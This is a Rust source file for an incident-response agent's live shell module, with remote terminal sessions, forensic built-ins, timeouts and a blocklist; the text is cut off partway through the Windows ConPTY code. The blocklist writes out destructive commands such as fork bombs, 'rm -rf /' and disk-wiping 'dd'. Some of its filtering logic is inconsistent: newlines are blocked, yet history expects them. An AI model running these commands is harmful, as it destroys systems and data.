//! Interactive Shell Handler Module
//!
//! Provides live response shell capabilities for incident response:
//! - PTY (pseudo-terminal) support on Linux/macOS
//! - ConPTY support on Windows
//! - Bidirectional streaming over WebSocket
//! - Command history
//! - Tab completion
//! - Built-in forensic commands
//!
//! Security:
//! - Command allowlist/blocklist
//! - Dangerous command confirmation
//! - Session timeout
//! - Full audit trail

// Live response shell. Buffer constants and session fields retained.
#![allow(dead_code, unused_variables)]

use anyhow::{anyhow, Result};
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, VecDeque};
use std::io::Read;
use std::sync::Arc;
use tokio::sync::{mpsc, Mutex, RwLock};
use tracing::{error, info, warn};
use uuid::Uuid;

/// Maximum command history size
const MAX_HISTORY_SIZE: usize = 1000;

/// Session timeout in seconds (default: 30 minutes)
const DEFAULT_SESSION_TIMEOUT_SECS: u64 = 1800;

/// Maximum output buffer size before flush
const MAX_OUTPUT_BUFFER: usize = 65536;

/// Shell session state
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SessionState {
    /// Session created but shell not started
    Created,
    /// Shell is running
    Running,
    /// Shell is paused (e.g., waiting for confirmation)
    Paused,
    /// Session terminated
    Terminated,
}

/// Shell input message from client
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum ShellInput {
    /// Raw terminal input (keystrokes)
    Data { data: String },
    /// Terminal resize event
    Resize { cols: u16, rows: u16 },
    /// Built-in command (bypasses shell)
    BuiltinCommand { command: String, args: Vec<String> },
    /// Ping/keepalive
    Ping,
    /// Request to terminate session
    Terminate,
    /// Confirm dangerous command
    ConfirmDangerous { command_id: String },
    /// Cancel dangerous command
    CancelDangerous { command_id: String },
}

/// Shell output message to client
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum ShellOutput {
    /// Raw terminal output
    Data { data: String },
    /// Session started
    SessionStarted {
        session_id: String,
        shell: String,
        cols: u16,
        rows: u16,
    },
    /// Session ended
    SessionEnded { reason: String },
    /// Command history entry
    HistoryEntry { index: usize, command: String },
    /// Tab completion suggestions
    Completions {
        prefix: String,
        suggestions: Vec<String>,
    },
    /// Pong response
    Pong { timestamp: u64 },
    /// Error message
    Error { message: String },
    /// Built-in command result
    BuiltinResult {
        command: String,
        success: bool,
        output: String,
        structured_data: Option<serde_json::Value>,
    },
    /// Dangerous command warning (requires confirmation)
    DangerousCommandWarning {
        command_id: String,
        command: String,
        warning: String,
    },
}

/// Command history entry for audit
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HistoryEntry {
    pub timestamp: u64,
    pub command: String,
    pub output_summary: Option<String>,
    pub exit_code: Option<i32>,
}

/// Dangerous command patterns that require confirmation
const DANGEROUS_PATTERNS: &[(&str, &str)] = &[
    ("rm -rf", "Recursive force delete"),
    ("del /s /q", "Recursive quiet delete (Windows)"),
    ("format", "Disk format command"),
    ("fdisk", "Disk partitioning"),
    ("mkfs", "Filesystem creation"),
    ("dd if=", "Direct disk write"),
    ("> /dev/sd", "Direct disk overwrite"),
    ("shutdown", "System shutdown"),
    ("reboot", "System reboot"),
    ("halt", "System halt"),
    ("init 0", "System shutdown"),
    ("init 6", "System reboot"),
    ("kill -9 1", "Kill init process"),
    ("pkill -9", "Force kill processes"),
    ("net user", "User management"),
    ("useradd", "Add user"),
    ("userdel", "Delete user"),
    ("passwd", "Change password"),
    ("chmod 777", "World-writable permissions"),
    ("iptables -F", "Flush firewall rules"),
    ("netsh firewall", "Modify firewall"),
    ("reg delete", "Registry deletion"),
    ("sc delete", "Service deletion"),
    ("systemctl disable", "Disable service"),
    ("crontab -r", "Remove all cron jobs"),
];

/// Commands that are completely blocked
const BLOCKED_COMMANDS: &[&str] = &[
    ":(){:|:&};:",   // Fork bomb
    ":(){ :|:& };:", // Fork bomb variant
    "rm -rf /",
    "rm -rf /*",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sda",
    "> /dev/sda",
    "mv / /dev/null",
];

/// Shell session configuration
#[derive(Debug, Clone)]
pub struct ShellConfig {
    /// Default shell to use
    pub shell: Option<String>,
    /// Initial terminal columns
    pub cols: u16,
    /// Initial terminal rows
    pub rows: u16,
    /// Session timeout in seconds
    pub timeout_secs: u64,
    /// Working directory
    pub working_dir: Option<String>,
    /// Environment variables to set
    pub environment: HashMap<String, String>,
    /// Enable command allowlist (if set, only these commands allowed)
    pub allowlist: Option<Vec<String>>,
    /// Command blocklist (these commands are never allowed)
    pub blocklist: Vec<String>,
    /// Require confirmation for dangerous commands
    pub require_dangerous_confirmation: bool,
    /// Enable command history recording
    pub record_history: bool,
    /// User ID for session (for audit)
    pub user_id: Option<String>,
}

impl Default for ShellConfig {
    fn default() -> Self {
        Self {
            shell: None,
            cols: 120,
            rows: 40,
            timeout_secs: DEFAULT_SESSION_TIMEOUT_SECS,
            working_dir: None,
            environment: HashMap::new(),
            allowlist: None,
            blocklist: BLOCKED_COMMANDS.iter().map(|s| s.to_string()).collect(),
            require_dangerous_confirmation: true,
            record_history: true,
            user_id: None,
        }
    }
}

/// Live shell session
pub struct ShellSession {
    /// Unique session ID
    pub session_id: String,
    /// Session configuration
    pub config: ShellConfig,
    /// Current state
    state: Arc<RwLock<SessionState>>,
    /// Command history
    history: Arc<Mutex<VecDeque<HistoryEntry>>>,
    /// Pending dangerous commands awaiting confirmation
    pending_dangerous: Arc<Mutex<HashMap<String, String>>>,
    /// Output sender channel
    output_tx: mpsc::Sender<ShellOutput>,
    /// Platform-specific shell handle
    #[cfg(target_os = "windows")]
    shell_handle: Option<WindowsConPty>,
    #[cfg(not(target_os = "windows"))]
    shell_handle: Option<UnixPty>,
    /// Session start time
    started_at: u64,
    /// Last activity timestamp
    last_activity: Arc<RwLock<u64>>,
}

impl ShellSession {
    /// Create a new shell session
    pub fn new(config: ShellConfig, output_tx: mpsc::Sender<ShellOutput>) -> Self {
        let session_id = Uuid::new_v4().to_string();
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();

        Self {
            session_id,
            config,
            state: Arc::new(RwLock::new(SessionState::Created)),
            history: Arc::new(Mutex::new(VecDeque::with_capacity(MAX_HISTORY_SIZE))),
            pending_dangerous: Arc::new(Mutex::new(HashMap::new())),
            output_tx,
            shell_handle: None,
            started_at: now,
            last_activity: Arc::new(RwLock::new(now)),
        }
    }

    /// Get session ID
    pub fn id(&self) -> &str {
        &self.session_id
    }

    /// Get current state
    pub async fn state(&self) -> SessionState {
        self.state.read().await.clone()
    }

    /// Start the shell session
    pub async fn start(&mut self) -> Result<()> {
        info!(session_id = %self.session_id, "Starting shell session");

        #[cfg(target_os = "windows")]
        {
            self.start_windows_shell().await?;
        }

        #[cfg(not(target_os = "windows"))]
        {
            self.start_unix_shell().await?;
        }

        *self.state.write().await = SessionState::Running;

        let shell_name = self.get_shell_name();
        self.output_tx
            .send(ShellOutput::SessionStarted {
                session_id: self.session_id.clone(),
                shell: shell_name,
                cols: self.config.cols,
                rows: self.config.rows,
            })
            .await
            .ok();

        // Start output reader task
        self.spawn_output_reader().await;

        // Start session timeout monitor
        self.spawn_timeout_monitor().await;

        Ok(())
    }

    /// Handle input from client
    pub async fn handle_input(&mut self, input: ShellInput) -> Result<()> {
        // Update last activity
        *self.last_activity.write().await = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();

        match input {
            ShellInput::Data { data } => {
                self.write_to_shell(&data).await?;
            }
            ShellInput::Resize { cols, rows } => {
                self.resize(cols, rows).await?;
            }
            ShellInput::BuiltinCommand { command, args } => {
                self.execute_builtin(&command, &args).await?;
            }
            ShellInput::Ping => {
                let timestamp = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_millis() as u64;
                self.output_tx
                    .send(ShellOutput::Pong { timestamp })
                    .await
                    .ok();
            }
            ShellInput::Terminate => {
                self.terminate("User requested termination").await?;
            }
            ShellInput::ConfirmDangerous { command_id } => {
                self.confirm_dangerous_command(&command_id).await?;
            }
            ShellInput::CancelDangerous { command_id } => {
                self.cancel_dangerous_command(&command_id).await?;
            }
        }

        Ok(())
    }

    /// Write data to the shell
    async fn write_to_shell(&mut self, data: &str) -> Result<()> {
        // Check for blocked commands
        if self.is_blocked_command(data) {
            self.output_tx
                .send(ShellOutput::Error {
                    message: "Command blocked for security reasons".to_string(),
                })
                .await
                .ok();
            return Ok(());
        }

        // Check for dangerous commands
        if self.config.require_dangerous_confirmation {
            if let Some((pattern, warning)) = self.check_dangerous_command(data) {
                let command_id = Uuid::new_v4().to_string();
                self.pending_dangerous
                    .lock()
                    .await
                    .insert(command_id.clone(), data.to_string());

                self.output_tx
                    .send(ShellOutput::DangerousCommandWarning {
                        command_id,
                        command: data.to_string(),
                        warning: format!(
                            "This command matches dangerous pattern '{}': {}. \
                             Please confirm to proceed.",
                            pattern, warning
                        ),
                    })
                    .await
                    .ok();

                return Ok(());
            }
        }

        // Check allowlist
        if let Some(ref allowlist) = self.config.allowlist {
            let cmd = data.split_whitespace().next().unwrap_or("");
            if !allowlist.iter().any(|a| cmd.starts_with(a)) {
                self.output_tx
                    .send(ShellOutput::Error {
                        message: format!("Command '{}' not in allowlist", cmd),
                    })
                    .await
                    .ok();
                return Ok(());
            }
        }

        // Record in history
        if self.config.record_history && !data.trim().is_empty() && data.ends_with('\n') {
            let entry = HistoryEntry {
                timestamp: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs(),
                command: data.trim().to_string(),
                output_summary: None,
                exit_code: None,
            };

            let mut history = self.history.lock().await;
            if history.len() >= MAX_HISTORY_SIZE {
                history.pop_front();
            }
            history.push_back(entry);
        }

        // Write to shell
        self.write_to_pty(data.as_bytes()).await
    }

    /// Check if command matches blocked patterns.
    ///
    /// **Security**: Also blocks shell metacharacters that could enable command
    /// injection attacks (e.g., chaining arbitrary commands after an allowed one).
    fn is_blocked_command(&self, command: &str) -> bool {
        // First check for shell metacharacters that enable command injection.
        // These MUST be blocked regardless of the blocklist contents.
        const INJECTION_PATTERNS: &[&str] = &[
            // Command chaining
            ";",  // Sequential execution
            "&&", // AND chaining
            "||", // OR chaining
            "|",  // Pipe to arbitrary commands
            // Command substitution
            "`",  // Backtick substitution
            "$(", // Modern command substitution
            // Redirection (can overwrite arbitrary files)
            ">", // Output redirect
            "<", // Input redirect
            // Newlines (inject separate commands)
            "\n", "\r",
        ];

        for pattern in INJECTION_PATTERNS {
            if command.contains(pattern) {
                return true;
            }
        }

        // Then check the configured blocklist
        let cmd_lower = command.to_lowercase();
        self.config
            .blocklist
            .iter()
            .any(|blocked| cmd_lower.contains(&blocked.to_lowercase()))
    }

    /// Check if command matches dangerous patterns
    fn check_dangerous_command(&self, command: &str) -> Option<(&str, &str)> {
        let cmd_lower = command.to_lowercase();
        DANGEROUS_PATTERNS
            .iter()
            .find(|(pattern, _)| cmd_lower.contains(&pattern.to_lowercase()))
            .copied()
    }

    /// Confirm and execute a dangerous command
    async fn confirm_dangerous_command(&mut self, command_id: &str) -> Result<()> {
        let command = self
            .pending_dangerous
            .lock()
            .await
            .remove(command_id)
            .ok_or_else(|| anyhow!("No pending command with ID {}", command_id))?;

        info!(
            session_id = %self.session_id,
            command = %command,
            "Dangerous command confirmed"
        );

        self.write_to_pty(command.as_bytes()).await
    }

    /// Cancel a dangerous command
    async fn cancel_dangerous_command(&mut self, command_id: &str) -> Result<()> {
        if self
            .pending_dangerous
            .lock()
            .await
            .remove(command_id)
            .is_some()
        {
            self.output_tx
                .send(ShellOutput::Data {
                    data: "\r\nCommand cancelled.\r\n".to_string(),
                })
                .await
                .ok();
        }
        Ok(())
    }

    /// Execute a built-in command
    async fn execute_builtin(&self, command: &str, args: &[String]) -> Result<()> {
        use crate::response::live_response::*;

        let result = match command {
            "ps" | "processes" => {
                let payload = serde_json::json!({
                    "filter": args.first().cloned()
                });
                let result = live_response_process_list(&payload).await;
                (result.success, result.error_message, result.result_data)
            }
            "netstat" | "connections" => {
                let payload = serde_json::json!({});
                let result = live_response_network_connections(&payload).await;
                (result.success, result.error_message, result.result_data)
            }
            "ls" | "dir" => {
                let path = args.first().map(|s| s.as_str()).unwrap_or(".");
                let payload = serde_json::json!({
                    "path": path,
                    "recursive": args.contains(&"-R".to_string()) || args.contains(&"/s".to_string()),
                    "include_hidden": !args.contains(&"-a".to_string())
                });
                let result = live_response_file_list(&payload).await;
                (result.success, result.error_message, result.result_data)
            }
            "cat" | "type" => {
                if let Some(path) = args.first() {
                    let payload = serde_json::json!({ "path": path });
                    let result = live_response_file_download(&payload).await;
                    if result.success {
                        // Decode base64 content and return as text
                        if let Some(data) = &result.result_data {
                            if let Some(content) = data.get("content").and_then(|c| c.as_str()) {
                                if let Ok(decoded) = base64::Engine::decode(
                                    &base64::engine::general_purpose::STANDARD,
                                    content,
                                ) {
                                    let text = String::from_utf8_lossy(&decoded).to_string();
                                    (true, None, Some(serde_json::json!({"content": text})))
                                } else {
                                    (result.success, result.error_message, result.result_data)
                                }
                            } else {
                                (result.success, result.error_message, result.result_data)
                            }
                        } else {
                            (result.success, result.error_message, result.result_data)
                        }
                    } else {
                        (result.success, result.error_message, result.result_data)
                    }
                } else {
                    (false, Some("Usage: cat <path>".to_string()), None)
                }
            }
            "hash" => {
                if let Some(path) = args.first() {
                    let payload = serde_json::json!({ "path": path });
                    let result = live_response_file_hash(&payload).await;
                    (result.success, result.error_message, result.result_data)
                } else {
                    (false, Some("Usage: hash <path>".to_string()), None)
                }
            }
            "services" => {
                let payload = serde_json::json!({
                    "filter": args.first().cloned()
                });
                let result = live_response_service_list(&payload).await;
                (result.success, result.error_message, result.result_data)
            }
            "autoruns" | "startup" => {
                let payload = serde_json::json!({});
                let result = live_response_startup_items(&payload).await;
                (result.success, result.error_message, result.result_data)
            }
            "tasks" | "schtasks" => {
                let payload = serde_json::json!({});
                let result = live_response_scheduled_tasks(&payload).await;
                (result.success, result.error_message, result.result_data)
            }
            "dns" | "dnscache" => {
                let payload = serde_json::json!({});
                let result = live_response_dns_cache(&payload).await;
                (result.success, result.error_message, result.result_data)
            }
            "reg" | "registry" => {
                if let Some(key) = args.first() {
                    let payload = serde_json::json!({
                        "key": key,
                        "recursive": args.contains(&"/s".to_string())
                    });
                    let result = live_response_registry_query(&payload).await;
                    (result.success, result.error_message, result.result_data)
                } else {
                    (false, Some("Usage: reg <key> [/s]".to_string()), None)
                }
            }
            "memdump" => {
                if let Some(pid_str) = args.first() {
                    if let Ok(pid) = pid_str.parse::<u64>() {
                        let payload = serde_json::json!({
                            "pid": pid,
                            "include_strings": args.contains(&"--strings".to_string())
                        });
                        let result = live_response_process_dump(&payload).await;
                        (result.success, result.error_message, result.result_data)
                    } else {
                        (false, Some("Invalid PID".to_string()), None)
                    }
                } else {
                    (
                        false,
                        Some("Usage: memdump <pid> [--strings]".to_string()),
                        None,
                    )
                }
            }
            "upload" => {
                if args.len() >= 2 {
                    let payload = serde_json::json!({
                        "path": args[0],
                        "content": args[1]  // Expect base64 content
                    });
                    let result = live_response_file_upload(&payload).await;
                    (result.success, result.error_message, result.result_data)
                } else {
                    (
                        false,
                        Some("Usage: upload <remote_path> <base64_content>".to_string()),
                        None,
                    )
                }
            }
            "download" => {
                if let Some(path) = args.first() {
                    let payload = serde_json::json!({ "path": path });
                    let result = live_response_file_download(&payload).await;
                    (result.success, result.error_message, result.result_data)
                } else {
                    (false, Some("Usage: download <path>".to_string()), None)
                }
            }
            "yara" => {
                let payload = serde_json::json!({
                    "pid": args.first().and_then(|s| s.parse::<u64>().ok()),
                    "rules": args.get(1).cloned().unwrap_or_else(|| "default".to_string())
                });
                let result = live_response_memory_scan(&payload).await;
                (result.success, result.error_message, result.result_data)
            }
            "history" => {
                let history = self.history.lock().await;
                let entries: Vec<_> = history
                    .iter()
                    .enumerate()
                    .map(|(i, e)| {
                        serde_json::json!({
                            "index": i,
                            "timestamp": e.timestamp,
                            "command": e.command
                        })
                    })
                    .collect();
                (true, None, Some(serde_json::json!({"history": entries})))
            }
            "help" => {
                let help_text = r#"
Built-in Live Response Commands:
================================
  ps [filter]         - List running processes
  netstat             - Show network connections
  ls/dir <path>       - List directory contents
  cat/type <path>     - Display file contents
  hash <path>         - Calculate file hashes (MD5, SHA1, SHA256)
  services [filter]   - List system services
  autoruns            - List startup items / persistence
  tasks               - List scheduled tasks
  dns                 - Display DNS cache
  reg <key> [/s]      - Query Windows registry
  memdump <pid>       - Dump process memory
  upload <path> <b64> - Upload file (base64 content)
  download <path>     - Download file
  yara [pid] [rules]  - Run YARA scan on process memory
  history             - Show command history
  help                - Show this help message
"#;
                (true, None, Some(serde_json::json!({"help": help_text})))
            }
            _ => (
                false,
                Some(format!(
                    "Unknown builtin command: {}. Type 'help' for available commands.",
                    command
                )),
                None,
            ),
        };

        let output = if let Some(data) = &result.2 {
            format_builtin_output(command, data)
        } else if let Some(err) = &result.1 {
            format!("Error: {}\r\n", err)
        } else {
            "Command completed.\r\n".to_string()
        };

        self.output_tx
            .send(ShellOutput::BuiltinResult {
                command: command.to_string(),
                success: result.0,
                output,
                structured_data: result.2,
            })
            .await
            .ok();

        Ok(())
    }

    /// Resize terminal
    async fn resize(&mut self, cols: u16, rows: u16) -> Result<()> {
        self.config.cols = cols;
        self.config.rows = rows;

        #[cfg(target_os = "windows")]
        {
            if let Some(ref mut handle) = self.shell_handle {
                handle.resize(cols, rows)?;
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            if let Some(ref mut handle) = self.shell_handle {
                handle.resize(cols, rows)?;
            }
        }

        Ok(())
    }

    /// Terminate session
    pub async fn terminate(&mut self, reason: &str) -> Result<()> {
        info!(
            session_id = %self.session_id,
            reason = reason,
            "Terminating shell session"
        );

        *self.state.write().await = SessionState::Terminated;

        #[cfg(target_os = "windows")]
        {
            if let Some(mut handle) = self.shell_handle.take() {
                handle.close()?;
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            if let Some(mut handle) = self.shell_handle.take() {
                handle.close()?;
            }
        }

        self.output_tx
            .send(ShellOutput::SessionEnded {
                reason: reason.to_string(),
            })
            .await
            .ok();

        Ok(())
    }

    /// Get command history
    pub async fn get_history(&self) -> Vec<HistoryEntry> {
        self.history.lock().await.iter().cloned().collect()
    }

    /// Get shell name for platform
    fn get_shell_name(&self) -> String {
        if let Some(ref shell) = self.config.shell {
            return shell.clone();
        }

        #[cfg(target_os = "windows")]
        {
            "cmd.exe".to_string()
        }

        #[cfg(not(target_os = "windows"))]
        {
            std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_string())
        }
    }

    // Platform-specific implementations

    #[cfg(target_os = "windows")]
    async fn start_windows_shell(&mut self) -> Result<()> {
        let shell = self.get_shell_name();
        let handle = WindowsConPty::new(&shell, self.config.cols, self.config.rows)?;
        self.shell_handle = Some(handle);
        Ok(())
    }

    #[cfg(not(target_os = "windows"))]
    async fn start_unix_shell(&mut self) -> Result<()> {
        let shell = self.get_shell_name();
        let handle = UnixPty::new(&shell, self.config.cols, self.config.rows)?;
        self.shell_handle = Some(handle);
        Ok(())
    }

    async fn write_to_pty(&mut self, data: &[u8]) -> Result<()> {
        #[cfg(target_os = "windows")]
        {
            if let Some(ref mut handle) = self.shell_handle {
                handle.write(data)?;
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            if let Some(ref mut handle) = self.shell_handle {
                handle.write(data)?;
            }
        }

        Ok(())
    }

    async fn spawn_output_reader(&self) {
        // Clone necessary data for the task
        let output_tx = self.output_tx.clone();
        let state = self.state.clone();

        #[cfg(target_os = "windows")]
        {
            if let Some(ref handle) = self.shell_handle {
                let mut reader = handle.get_reader();
                tokio::spawn(async move {
                    let mut buffer = vec![0u8; 4096];
                    loop {
                        if *state.read().await == SessionState::Terminated {
                            break;
                        }

                        match reader.read(&mut buffer) {
                            Ok(0) => break,
                            Ok(n) => {
                                let data = String::from_utf8_lossy(&buffer[..n]).to_string();
                                if output_tx.send(ShellOutput::Data { data }).await.is_err() {
                                    break;
                                }
                            }
                            Err(e) => {
                                error!("Shell read error: {}", e);
                                break;
                            }
                        }
                    }
                });
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            if let Some(ref handle) = self.shell_handle {
                let mut reader = handle.get_reader();
                tokio::spawn(async move {
                    let mut buffer = vec![0u8; 4096];
                    loop {
                        if *state.read().await == SessionState::Terminated {
                            break;
                        }

                        match reader.read(&mut buffer) {
                            Ok(0) => break,
                            Ok(n) => {
                                let data = String::from_utf8_lossy(&buffer[..n]).to_string();
                                if output_tx.send(ShellOutput::Data { data }).await.is_err() {
                                    break;
                                }
                            }
                            Err(e) => {
                                error!("Shell read error: {}", e);
                                break;
                            }
                        }
                    }
                });
            }
        }
    }

    async fn spawn_timeout_monitor(&self) {
        let state = self.state.clone();
        let last_activity = self.last_activity.clone();
        let timeout_secs = self.config.timeout_secs;
        let output_tx = self.output_tx.clone();
        let session_id = self.session_id.clone();

        tokio::spawn(async move {
            loop {
                tokio::time::sleep(tokio::time::Duration::from_secs(60)).await;

                if *state.read().await == SessionState::Terminated {
                    break;
                }

                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs();

                let last = *last_activity.read().await;

                if now - last > timeout_secs {
                    warn!(
                        session_id = %session_id,
                        "Shell session timed out due to inactivity"
                    );

                    *state.write().await = SessionState::Terminated;
                    output_tx
                        .send(ShellOutput::SessionEnded {
                            reason: "Session timed out due to inactivity".to_string(),
                        })
                        .await
                        .ok();
                    break;
                }
            }
        });
    }
}

/// Format built-in command output for display
fn format_builtin_output(command: &str, data: &serde_json::Value) -> String {
    match command {
        "ps" | "processes" => {
            if let Some(processes) = data.get("processes").and_then(|p| p.as_array()) {
                let mut output = format!(
                    "{:<8} {:<30} {:<8} {:<10}\r\n",
                    "PID", "NAME", "STATUS", "MEMORY"
                );
                output.push_str(&"-".repeat(60));
                output.push_str("\r\n");
                for proc in processes.iter().take(50) {
                    let pid = proc.get("pid").and_then(|p| p.as_u64()).unwrap_or(0);
                    let name = proc.get("name").and_then(|n| n.as_str()).unwrap_or("?");
                    let status = proc.get("status").and_then(|s| s.as_str()).unwrap_or("?");
                    let memory = proc.get("memory").and_then(|m| m.as_u64()).unwrap_or(0);
                    output.push_str(&format!(
                        "{:<8} {:<30} {:<8} {:<10}\r\n",
                        pid,
                        &name[..name.len().min(30)],
                        status,
                        format_bytes(memory)
                    ));
                }
                output
            } else {
                serde_json::to_string_pretty(data).unwrap_or_default()
            }
        }
        "netstat" | "connections" => {
            if let Some(connections) = data.get("connections").and_then(|c| c.as_array()) {
                let mut output = format!(
                    "{:<8} {:<25} {:<25} {:<12} {:<8}\r\n",
                    "PROTO", "LOCAL", "REMOTE", "STATE", "PID"
                );
                output.push_str(&"-".repeat(80));
                output.push_str("\r\n");
                for conn in connections.iter().take(50) {
                    let proto = conn.get("protocol").and_then(|p| p.as_str()).unwrap_or("?");
                    let local = conn
                        .get("local_address")
                        .and_then(|l| l.as_str())
                        .unwrap_or("?");
                    let remote = conn
                        .get("remote_address")
                        .and_then(|r| r.as_str())
                        .unwrap_or("?");
                    let state = conn.get("state").and_then(|s| s.as_str()).unwrap_or("?");
                    let pid = conn.get("pid").and_then(|p| p.as_str()).unwrap_or("?");
                    output.push_str(&format!(
                        "{:<8} {:<25} {:<25} {:<12} {:<8}\r\n",
                        proto, local, remote, state, pid
                    ));
                }
                output
            } else {
                serde_json::to_string_pretty(data).unwrap_or_default()
            }
        }
        "ls" | "dir" => {
            if let Some(files) = data.get("files").and_then(|f| f.as_array()) {
                let mut output = format!(
                    "{:<10} {:<12} {:<20} {}\r\n",
                    "TYPE", "SIZE", "MODIFIED", "NAME"
                );
                output.push_str(&"-".repeat(70));
                output.push_str("\r\n");
                for file in files {
                    let is_dir = file
                        .get("is_directory")
                        .and_then(|d| d.as_bool())
                        .unwrap_or(false);
                    let size = file.get("size").and_then(|s| s.as_u64()).unwrap_or(0);
                    let name = file.get("name").and_then(|n| n.as_str()).unwrap_or("?");
                    let modified = file.get("modified").and_then(|m| m.as_u64());
                    let mod_str = modified
                        .map(format_timestamp)
                        .unwrap_or_else(|| "?".to_string());
                    output.push_str(&format!(
                        "{:<10} {:<12} {:<20} {}\r\n",
                        if is_dir { "<DIR>" } else { "<FILE>" },
                        if is_dir {
                            "-".to_string()
                        } else {
                            format_bytes(size)
                        },
                        mod_str,
                        name
                    ));
                }
                output
            } else {
                serde_json::to_string_pretty(data).unwrap_or_default()
            }
        }
        "hash" => {
            let md5 = data.get("md5").and_then(|h| h.as_str()).unwrap_or("?");
            let sha1 = data.get("sha1").and_then(|h| h.as_str()).unwrap_or("?");
            let sha256 = data.get("sha256").and_then(|h| h.as_str()).unwrap_or("?");
            format!(
                "MD5:    {}\r\nSHA1:   {}\r\nSHA256: {}\r\n",
                md5, sha1, sha256
            )
        }
        "help" => data
            .get("help")
            .and_then(|h| h.as_str())
            .unwrap_or("")
            .to_string(),
        "history" => {
            if let Some(history) = data.get("history").and_then(|h| h.as_array()) {
                let mut output = String::new();
                for entry in history {
                    let index = entry.get("index").and_then(|i| i.as_u64()).unwrap_or(0);
                    let command = entry.get("command").and_then(|c| c.as_str()).unwrap_or("?");
                    output.push_str(&format!("{:>4}  {}\r\n", index, command));
                }
                output
            } else {
                "No history.\r\n".to_string()
            }
        }
        _ => serde_json::to_string_pretty(data).unwrap_or_default() + "\r\n",
    }
}

fn format_bytes(bytes: u64) -> String {
    const KB: u64 = 1024;
    const MB: u64 = KB * 1024;
    const GB: u64 = MB * 1024;

    if bytes >= GB {
        format!("{:.1}GB", bytes as f64 / GB as f64)
    } else if bytes >= MB {
        format!("{:.1}MB", bytes as f64 / MB as f64)
    } else if bytes >= KB {
        format!("{:.1}KB", bytes as f64 / KB as f64)
    } else {
        format!("{}B", bytes)
    }
}

fn format_timestamp(ts: u64) -> String {
    use chrono::{TimeZone, Utc};
    Utc.timestamp_opt(ts as i64, 0)
        .single()
        .map(|dt| dt.format("%Y-%m-%d %H:%M").to_string())
        .unwrap_or_else(|| "?".to_string())
}

// =============================================================================
// Windows ConPTY Implementation
// =============================================================================

#[cfg(target_os = "windows")]
mod windows_pty {
    use super::*;
    use std::io::Read;
    use std::os::windows::io::{AsRawHandle, FromRawHandle, OwnedHandle, RawHandle};

    use windows::core::PWSTR;
    use windows::Win32::Foundation::{CloseHandle, HANDLE};

    use windows::Win32::System::Console::{
        ClosePseudoConsole, CreatePseudoConsole, ResizePseudoConsole, COORD, HPCON,
    };
    use windows::Win32::System::Pipes::CreatePipe;
    use windows::Win32::System::Threading::{
        CreateProcessW, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList,
        UpdateProcThreadAttribute, CREATE_UNICODE_ENVIRONMENT, EXTENDED_STARTUPINFO_PRESENT,
        PROCESS_INFORMATION, PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, STARTUPINFOEXW,
    };

    pub struct WindowsConPty {
        hpc: HPCON,
        process_info: PROCESS_INFORMATION,
        input_write: OwnedHandle,
        output_read: OwnedHandle,
    }

    impl WindowsConPty {
        pub fn new(shell: &str, cols: u16, rows: u16) -> Result<Self> {
            unsafe {
                // Create pipes for PTY I/O
                let mut input_read: HANDLE = HANDLE::default();
                let mut input_write: HANDLE = HANDLE::default();
                let mut output_read: HANDLE = HANDLE::default();
                let mut output_write: HANDLE = HANDLE::default();

                CreatePipe(&mut input_read, &mut input_write, None, 0)?;
                CreatePipe(&mut output_read, &mut output_write, None, 0)?;

                // Create pseudo console
                let size = COORD {
                    X: cols as i16,
                    Y: rows as i16,
                };

                let hpc = CreatePseudoConsole(size, input_read, output_write, 0)
                    .map_err(|e| anyhow!("Failed to create pseudo console: {:?}", e))?;

                // Close handles that ConPTY now owns
                CloseHandle(input_read)?;
                CloseHandle(output_write)?;

                // Initialize startup info with pseudo console
                let mut attr_list_size: usize = 0;
                // First call intentionally returns ERROR_INSUFFICIENT_BUFFER to populate the size.
                let _ = InitializeProcThreadAttributeList(
                    windows::Win32::System::Threading::LPPROC_THREAD_ATTRIBUTE_LIST::default(),
                    1,
                    0,
                    &mut attr_list_size,
                );

                let attr_list_buffer = vec![0u8; attr_list_size];
                let attr_list = windows::Win32::System::Threading::LPPROC_THREAD_ATTRIBUTE_LIST(
                    attr_list_buffer.as_ptr() as *mut _,
                );

                InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_list_size)?;

                UpdateProcThreadAttribute(
                    attr_list,
                    0,
                    PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE as usize,
                    Some(hpc.0 as *const _),
                    std::mem::size_of::<HPCON>(),
                    None,
                    None,
                )?;

                let mut startup_info = STARTUPINFOEXW {
                    StartupInfo: std::mem::zeroed(),
                    lpAttributeList: attr_list,
                };
                startup_info.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;

                let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

                // Create process
                let shell_wide: Vec<u16> = shell.encode_utf16().chain(std::iter::once(0)).collect();
                let mut cmd_line = shell_wide.clone();

                CreateProcessW(
                    None,
                    PWSTR(cmd_line.as_mut_ptr()),
                    None,
                    None,
                    false,
                    EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT,
                    None,
                    None,
                    &startup_info.StartupInfo,
                    &mut process_info,
                )?;

                DeleteProcThreadAttributeList(attr_list);

                Ok(Self {
                    hpc,
                    process_info,
                    input_write: OwnedHandle::from_raw_handle(input_write.0 as RawHandle),
